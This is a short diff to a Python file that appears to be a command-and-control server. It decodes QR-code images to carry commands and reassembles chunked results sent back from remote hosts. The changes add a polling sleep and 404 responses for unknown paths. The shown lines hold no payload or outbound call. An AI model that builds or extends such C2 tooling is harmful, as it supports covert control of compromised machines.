@@ -1,5 +1,6 @@
 import os
 import subprocess
+import time
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from PIL import Image
 from pyzbar.pyzbar import decode
@@ -107,6 +108,8 @@ def decode_chunked_results():
                 print(f"[+] Complete result from {result_id}:\n{complete_output}")
                 del assembled_results[result_id]
 
+        time.sleep(POLL_INTERVAL)
+
 
 class C2ServerHandler(SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
@@ -124,6 +127,9 @@ class C2ServerHandler(SimpleHTTPRequestHandler):
             else:
                 self.send_response(404)
                 self.end_headers()
+        else:
+            self.send_response(404)
+            self.end_headers()
 
     def do_POST(self):
         if self.path.startswith('/result'):
